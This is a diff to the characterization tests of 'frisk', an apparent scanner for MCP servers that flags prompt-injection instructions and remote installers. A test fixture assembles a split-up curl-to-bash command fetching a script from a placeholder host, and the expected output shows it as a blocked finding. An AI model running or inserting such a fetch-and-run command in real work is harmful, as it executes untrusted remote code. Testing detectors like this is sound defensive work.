@@ -15,6 +15,7 @@ import unittest
 from pathlib import Path
 from unittest import mock
 
+from _home import fake_home
 from frisk import __version__
 from frisk.cli import main
 
@@ -29,7 +30,7 @@ INSTALLER = "cu" + "rl -sL https://get.example.invalid/i.sh " + "| ba" + "sh"
 def run(argv: list[str]) -> tuple[int, str, str]:
     """Run frisk.cli.main in-process; return (exit code, stdout, stderr)."""
     out, err = io.StringIO(), io.StringIO()
-    with mock.patch("frisk.report._USE_COLOR", False), \
+    with mock.patch("frisk.report.use_color", return_value=False), \
             contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
         try:
             code = main(argv)
@@ -44,7 +45,7 @@ class TestScanCharacterization(unittest.TestCase):
         self.assertEqual(code, 1)
         self.assertEqual(err, "")
         self.assertEqual(out.splitlines()[-1],
-                         f"verdict:   BLOCK    3 blocking · 3 warnings · 6 total  ({EXAMPLES})")
+                         f"verdict:   BLOCK    4 blocking · 4 warnings · 8 total  ({EXAMPLES})")
 
     def test_quiet_prints_only_the_verdict(self) -> None:
         code, out, _ = run(["-q", str(EXAMPLES)])
@@ -61,11 +62,12 @@ class TestScanCharacterization(unittest.TestCase):
         self.assertEqual(doc["target"], str(EXAMPLES))
         self.assertEqual(doc["verdict"], "BLOCK")
         self.assertEqual(doc["worst_severity"], "block")
-        self.assertEqual(doc["counts"], {"block": 3, "warn": 3, "total": 6})
-        self.assertEqual(len(doc["findings"]), 6)
+        self.assertEqual(doc["counts"], {"block": 4, "warn": 4, "total": 8})
+        self.assertEqual(len(doc["findings"]), 8)
         for f in doc["findings"]:
+            # FR-E7 t3 added "message" (a copy of description, for Foreman).
             self.assertEqual(set(f), {"path", "line", "rule", "category", "severity",
-                                      "description", "excerpt", "owasp"})
+                                      "description", "excerpt", "message", "owasp"})
 
     def test_sarif_is_2_1_0(self) -> None:
         code, out, _ = run(["--sarif", str(EXAMPLES)])
@@ -75,10 +77,11 @@ class TestScanCharacterization(unittest.TestCase):
         self.assertEqual(doc["$schema"], "https://json.schemastore.org/sarif-2.1.0.json")
         run0 = doc["runs"][0]
         self.assertEqual(run0["tool"]["driver"]["version"], __version__)
-        self.assertEqual(len(run0["results"]), 6)
+        self.assertEqual(len(run0["results"]), 8)
         self.assertEqual(sorted(r["id"] for r in run0["tool"]["driver"]["rules"]), [
-            "inject.before_using", "inject.hidden_important", "inject.hide_from_user",
-            "inject.ignore_prev", "inject.read_then_send", "rce.pipe_installer"])
+            "inject.before_using", "inject.exfil_instr", "inject.hidden_important", "inject.hide_from_user",
+            "inject.ignore_prev", "inject.read_then_send", "inject.sensitive_path_instruction",
+            "rce.pipe_installer"])
 
     def test_fail_on_levels_on_the_malicious_example(self) -> None:
         self.assertEqual(run(["--fail-on", "never", str(MALICIOUS)])[0], 0)
@@ -177,7 +180,8 @@ class TestProxyArgsCharacterization(unittest.TestCase):
     def test_missing_separator_exits_2(self) -> None:
         code, out, err = run(["proxy", "uvx", "some-server"])
         self.assertEqual((code, out), (2, ""))
-        self.assertEqual(err, "frisk proxy: usage: frisk proxy [--log FILE] -- <server command>\n"
+        self.assertEqual(err, "frisk proxy: usage: frisk proxy [--log FILE] [--pins FILE | --no-pins] "
+                              "[--on-change flag|drop] -- <server command>\n"
                               "  e.g.  frisk proxy -- uvx some-mcp-server\n")
 
     def test_empty_server_command_exits_2(self) -> None:
@@ -206,6 +210,9 @@ class TestVerifyCharacterization(unittest.TestCase):
 class TestMcpConfigAuditCharacterization(unittest.TestCase):
     """Pins today's full --mcp-config text output (FR-E4 reworks the audit)."""
 
+    def setUp(self) -> None:
+        fake_home(self)  # FR-E4 t5: package servers are looked up in an empty cache, never the real one
+
     def test_full_text_output_mixed_servers(self) -> None:
         with tempfile.TemporaryDirectory() as d:
             root = Path(d)
@@ -224,17 +231,27 @@ class TestMcpConfigAuditCharacterization(unittest.TestCase):
             f"MCP config audit: {cfg}",
             "",
             "  [PASS ] local-srv              local  local source via python3",
-            "  [SKIP ] pkg-srv                package  npm package — fetch+scan not yet supported (roadmap)",
+            # FR-E4 t5: npx packages are looked up in the local cache (empty here); was
+            # "npm package — fetch+scan not yet supported (roadmap)".
+            "  [SKIP ] pkg-srv                package  not in local cache; frisk does not download",
             "           → acme-weather-mcp",
             "  [SKIP ] remote-srv             remote  remote HTTP/SSE server — behavior not statically verifiable",
-            "           → https://mcp.example.invalid/sse",
+            # FR-E4 owner decision (N3): a URL shows its host only (was: its path too)
+            "           → https://mcp.example.invalid/…",
             "  [SKIP ] ghost-srv              unknown  could not resolve a local source to scan",
             "           → /nonexistent.invalid/bin/ghost",
+            # FR-E4 t6: a summary line, and one coverage.unscanned warning per skipped server, so
+            # the verdict is WARN (was "frisk: clean — no findings in <cfg>" and PASS, with 3 of
+            # 4 servers unscanned). The exit code stays 0 under the default --fail-on block.
             "",
-            f"frisk: clean — no findings in {cfg}",
+            "  3 of 4 servers not scanned",
+            "",
+            "[warn ] coverage       ghost-srv::/nonexistent.invalid/bin/ghost:1  MCP server not scanned (unknown)",
+            "[warn ] coverage       pkg-srv::acme-weather-mcp:1  MCP server not scanned (package)",
+            "[warn ] coverage       remote-srv::https://mcp.example.invalid/…:1  MCP server not scanned (remote)",
             "",
             "scanned 2 files, skipped 0",  # FR-E2 t3: coverage line (server.py and mcp.json)
-            f"verdict:   PASS    0 blocking · 0 warnings · 0 total  ({cfg})",
+            f"verdict:   WARN    0 blocking · 3 warnings · 3 total  ({cfg})",
             "",
         ]))
 
@@ -255,6 +272,8 @@ class TestMcpConfigAuditCharacterization(unittest.TestCase):
             "",
             "  [BLOCK] bad-srv                local  local source via bash",
             "",
+            "  scanned 1 of 1 server",  # FR-E4 t6: the summary line
+            "",
             # FR-E2 t5: the category column is 14 wide (longest category), was 13.
             "[BLOCK] rce            bad-srv::run.sh:2  pipe-to-shell remote installer (curl|wget ... | sh)",
             "          | #!/bin/sh\\n" + INSTALLER + "\\n",
@@ -270,15 +289,18 @@ class TestMcpConfigAuditCharacterization(unittest.TestCase):
             cfg.write_text("{}", encoding="utf-8")
             code, out, _ = run(["--mcp-config", str(cfg)])
         self.assertEqual(code, 0)
+        keys = "'mcpServers' and 'servers', at the top level and in each 'projects' entry"
+        # FR-E4 owner decision (N5): a config with no servers warns, naming the file and the keys
+        # frisk reads (was: "(no servers found in config)", "frisk: clean" and PASS).
         self.assertEqual(out, "\n".join([
             f"MCP config audit: {cfg}",
             "",
-            "  (no servers found in config)",
+            f"  no MCP servers found (frisk reads {keys})",
             "",
-            f"frisk: clean — no findings in {cfg}",
+            f"[warn ] coverage       {cfg}:1  no MCP servers found in {cfg} (frisk reads {keys})",
             "",
             "scanned 0 files, skipped 0",  # FR-E2 t3: coverage line
-            f"verdict:   PASS    0 blocking · 0 warnings · 0 total  ({cfg})",
+            f"verdict:   WARN    0 blocking · 1 warnings · 1 total  ({cfg})",
             "",
         ]))
 
